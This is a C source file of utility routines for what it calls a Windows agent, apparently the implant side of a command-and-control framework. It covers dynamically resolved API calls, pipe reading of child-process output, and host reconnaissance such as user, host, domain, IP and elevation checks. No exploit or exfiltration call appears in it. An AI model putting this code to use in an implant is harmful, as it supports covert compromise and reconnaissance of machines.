// 文件作用：Windows agent 通用工具实现：内存、管道读取、随机数、主机信息、字符串和时间转换。
#include "ApiLoader.h"

//////////

// MemAllocLocal 统一封装本地内存申请，当前底层使用 LocalAlloc。
LPVOID MemAllocLocal(DWORD bufferSize) 
{
	return ApiWin->LocalAlloc(LPTR, bufferSize);
	//return ApiWin->HeapAlloc(GetProcessHeap(), 0, bufferSize);
}

// MemReallocLocal 统一封装本地内存扩容/缩容。
LPVOID MemReallocLocal(LPVOID buffer, DWORD bufferSize) 
{
    LPVOID mem = ApiWin->LocalReAlloc( buffer, bufferSize, LMEM_MOVEABLE);
    //LPVOID mem = ApiWin->HeapReAlloc(GetProcessHeap(), 0, buffer, bufferSize);
    return mem;
}

// MemFreeLocal 清零并释放内存指针，减少敏感数据残留。
void MemFreeLocal(LPVOID* buffer, DWORD bufferSize) 
{
    if (*buffer == NULL)
        return;

    memset((PBYTE)*buffer, 0, bufferSize);
	ApiWin->LocalFree(*buffer);
	*buffer = NULL;
    //ApiWin->HeapFree(GetProcessHeap(), 0, *buffer);
    //*buffer = NULL;
}

//////////

// ReadDataFromAnonPipe 从匿名管道读取子进程输出，并自动扩容缓冲区。
BYTE* ReadDataFromAnonPipe(HANDLE hPipe, ULONG* bufferSize)
{
    BOOL  result = FALSE;
    ULONG read = 0;
    static BYTE buf[0x2000] = { 0 };
    LPVOID buffer = MemAllocLocal(0);
    do {
        DWORD available = 0;
        ApiWin->PeekNamedPipe(hPipe, NULL, 0x1000, NULL, &available, NULL);
        
        if (available > 0) {
            result = ApiWin->ReadFile(hPipe, buf, 0x1000, &read, NULL);
            if (read == 0)
                break;

            *bufferSize += read;

            buffer = MemReallocLocal(buffer, *bufferSize);
            memcpy((BYTE*)buffer + (*bufferSize - read), buf, read);
            memset(buf, 0, read);
        }
        else {
            result = FALSE;
        }

        if (*bufferSize > 0x100000)
            break;

    } while (result);

    return (BYTE*)buffer;
}

//////////

// GenerateRandom32 用系统时间和 RtlRandomEx 生成一个 32 位随机数。
ULONG GenerateRandom32()
{
#if DIRECT_HTTPS_MINIMAL_IDENTITY
	static ULONG state = 0;
	if (state == 0)
		state = ApiWin->GetTickCount() ^ 0x9e3779b9;
	state = state * 1664525 + 1013904223;
	return state;
#else
	ULONG seed = ApiWin->GetTickCount();
	seed = ApiNt->RtlRandomEx(&seed);
	return seed;
#endif
}

// GetGmtOffset 获取当前时区相对 GMT 的小时偏移。
BYTE GetGmtOffset() 
{
	TIME_ZONE_INFORMATION temp;
	ApiWin->GetTimeZoneInformation(&temp);
	BYTE diff = temp.Bias / (-60);
	return diff;
}

// IsElevate 判断当前进程是否拥有管理员级别权限。
BOOL IsElevate() 
{
    BOOL            success   = FALSE;
    BOOL            high      = FALSE;
    HANDLE          hToken    = NULL;
    TOKEN_ELEVATION Elevation = { 0 };
    DWORD           cbSize    = sizeof(TOKEN_ELEVATION);

    NTSTATUS NtStatus = ApiNt->NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(NtStatus)) {
        success = ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize);
        if (success) 
            high = (BOOL)Elevation.TokenIsElevated;
    }

    if (hToken) {
        ApiNt->NtClose(hToken);
        hToken = NULL;
    }
    return high;
}

// GetInternalIpLong 遍历网卡信息，取一个可用的内网 IPv4。
ULONG GetInternalIpLong()
{
	ULONG   internalIP      = 0;
	ULONG   success         = 0;
    ULONG   length          = 0;
	IN_ADDR ipAddressObject = { 0 };
	LPCSTR  terminator = NULL;
    ApiWin->GetAdaptersInfo(NULL, &length);
	PIP_ADAPTER_INFO Adapter = (PIP_ADAPTER_INFO)MemAllocLocal(length);
    if ( Adapter ) {

        PIP_ADAPTER_INFO nextAdapter = Adapter;
		success = ApiWin->GetAdaptersInfo(nextAdapter, &length);
		if (success == NO_ERROR ) {
            while (nextAdapter) {

				success = ApiNt->RtlIpv4StringToAddressA(nextAdapter->IpAddressList.IpAddress.String, FALSE, &terminator, &ipAddressObject);
				if ( success == ERROR_SUCCESS && ipAddressObject.S_un.S_addr != 0 ) {
					internalIP = ipAddressObject.S_un.S_addr;
					break;
				}
				nextAdapter = nextAdapter->Next;
            }
        }
        MemFreeLocal((LPVOID*)&Adapter, length);
        nextAdapter = NULL;
    }
    return internalIP;
}

// _GetUserName 获取当前 Windows 用户名。
CHAR* _GetUserName()
{
    DWORD length = 0;
    ApiWin->GetUserNameA(NULL, &length);
    CHAR* userName = (CHAR*)MemAllocLocal(length);
    if (userName)
        ApiWin->GetUserNameA(userName, &length);
    return userName;
}

// _GetHostName 获取当前计算机名。
CHAR* _GetHostName()
{
    DWORD length = 0;
    ApiWin->GetComputerNameExA(ComputerNameNetBIOS, NULL, &length);
    CHAR* hostName = (CHAR*)MemAllocLocal(length);
    if (hostName)
        ApiWin->GetComputerNameExA(ComputerNameNetBIOS, hostName, &length);
    return hostName;
}

// _GetDomainName 获取当前域名或工作组名。
CHAR* _GetDomainName()
{
    DWORD length = 0;
    ApiWin->GetComputerNameExA(ComputerNameDnsDomain, NULL, &length);
    CHAR* hostName = (CHAR*)MemAllocLocal(length);
    if (hostName)
        ApiWin->GetComputerNameExA(ComputerNameDnsDomain, hostName, &length);
    return hostName;
}

// _GetProcessName 获取当前进程名。
CHAR* _GetProcessName()
{
    DWORD length = ((PRTL_USER_PROCESS_PARAMETERS)NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Length / 2;
    PWCHAR tmpName = ((PRTL_USER_PROCESS_PARAMETERS)NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer;
    int i = 0;
    for (; tmpName[length - i] != L'\\' && (length - i) >= 0; i++);
    CHAR* processName = (CHAR*)MemAllocLocal(i);
    ApiWin->GetModuleBaseNameA((HANDLE) -1, NULL, processName, i);
    return processName;
}

///////////

// StrChrA 在字符串中查找某个字符第一次出现的位置。
CHAR* StrChrA(CHAR* str, CHAR c) 
{
    while (*str) {
        if (*str == c)
            return (char*)str;
        str++;
    }

    return NULL;
}

// StrTokA 是简化版字符串分割函数，类似 strtok。
CHAR* StrTokA(CHAR* str, CHAR* delim)
{
    static char* context = nullptr;
    if (str != nullptr)
        context = str;

    if (context == nullptr)
        return nullptr;

    while (*context && StrChrA(delim, *context))
        ++context;

    if (*context == '\0')
        return nullptr;

    char* token_start = context;
    while (*context && !StrChrA(delim, *context))
        ++context;

    if (*context) {
        *context = '\0';
        ++context;
    }

    return token_start;
}

// StrCmpA 比较两个普通字符串是否相同。
DWORD StrCmpA(const CHAR* str1, const CHAR* str2)
{
    while (*str1 && (*str1 == *str2)) {
        str1++;
        str2++;
    }

    return (unsigned char)*str1 - (unsigned char)*str2;
}

// StrNCmpA 只比较前 n 个字符。
DWORD StrNCmpA( CHAR* str1,  CHAR* str2, SIZE_T n)
{
    while (n > 0 && *str1 && (*str1 == *str2)) {
        str1++;
        str2++;
        n--;
    }

    if (n == 0)
        return 0;
 
    return (unsigned char)*str1 - (unsigned char)*str2;
}

// StrCmpLowA 忽略大小写比较 ASCII 字符串。
DWORD StrCmpLowA(CHAR* str1, CHAR* str2)
{
    while (*str1 && *str2) {
        char ch1 = *str1;
        char ch2 = *str2;

        if (ch1 >= 'A' && ch1 <= 'Z')
            ch1 += 0x20;
        if (ch2 >= 'A' && ch2 <= 'Z') 
            ch2 += 0x20;

        if (ch1 != ch2)
            return (unsigned char)ch1 - (unsigned char)ch2;

        ++str1;
        ++str2;
    }

    if(*str1 == 0 && *str2 == 0)
        return 0;

    return (unsigned char)*str1 - (unsigned char)*str2;
}

// StrCmpLowW 忽略大小写比较宽字符串。
DWORD StrCmpLowW(WCHAR* str1, WCHAR* str2)
{
    while (*str1 && *str2) {
        wchar_t ch1 = *str1;
        wchar_t ch2 = *str2;

        if (ch1 >= L'A' && ch1 <= L'Z')
            ch1 += 0x20;
        if (ch2 >= L'A' && ch2 <= L'Z')
            ch2 += 0x20;

        if (ch1 != ch2)
            return ch1 - ch2;

        ++str1;
        ++str2;
    }

    if (*str1 == L'\0' && *str2 == L'\0')
        return 0;

    return *str1 - *str2;
}

// StrLenA 计算普通字符串长度。
DWORD StrLenA(const CHAR* str)
{
    int i = 0;
    if (str != NULL)
        for (; str[i]; i++);
    return i;
}

// StrIndexA 返回字符在字符串中的下标，找不到返回 -1。
DWORD StrIndexA(CHAR* str, CHAR target)
{
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] == target)
            return i;
    }
    return -1;
}

// StrLCopyA 安全复制字符串，限制最大长度并补 0。
LPSTR StrLCopyA(LPSTR dst, LPCSTR src, int iMaxLength) 
{
    if (!dst || !src || iMaxLength <= 0)
        return NULL;

    LPSTR d  = dst;
    LPCSTR s = src;
    int n    = iMaxLength;

    while (--n > 0 && *s)
        *d++ = *s++;
    *d = '\0';

    return dst;
}

// FileTimeToUnixTimestamp 把 Windows FILETIME 转成 Unix 时间戳。
ULONG FileTimeToUnixTimestamp(FILETIME ft) 
{
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;

    const DWORD EPOCH_DIFFERENCE_LOW  = 0xD53E8000; 
    const DWORD EPOCH_DIFFERENCE_HIGH = 0x019DB1DE; 

    if (uli.LowPart < EPOCH_DIFFERENCE_LOW) {
        uli.LowPart -= EPOCH_DIFFERENCE_LOW;
        uli.HighPart -= EPOCH_DIFFERENCE_HIGH + 1;
    }
    else {
        uli.LowPart -= EPOCH_DIFFERENCE_LOW;
        uli.HighPart -= EPOCH_DIFFERENCE_HIGH;
    }

    DWORD quotient = 0;
    DWORD remainder = 0;
    for (int i = 63; i >= 0; i--) {
        remainder <<= 1;
        if (i >= 32) {
            remainder |= (uli.HighPart >> (i - 32)) & 1;
        }
        else {
            remainder |= (uli.LowPart >> i) & 1;
        }

        if (remainder >= 10000000) {
            remainder -= 10000000;
            quotient |= (1UL << i);
        }
    }
    return quotient;
}

// GetSystemTimeAsUnixTimestamp 获取当前系统时间并转成 Unix 时间戳。
ULONG GetSystemTimeAsUnixTimestamp()
{
    FILETIME ft;
    ApiWin->GetSystemTimeAsFileTime(&ft);
    return FileTimeToUnixTimestamp(ft);
}
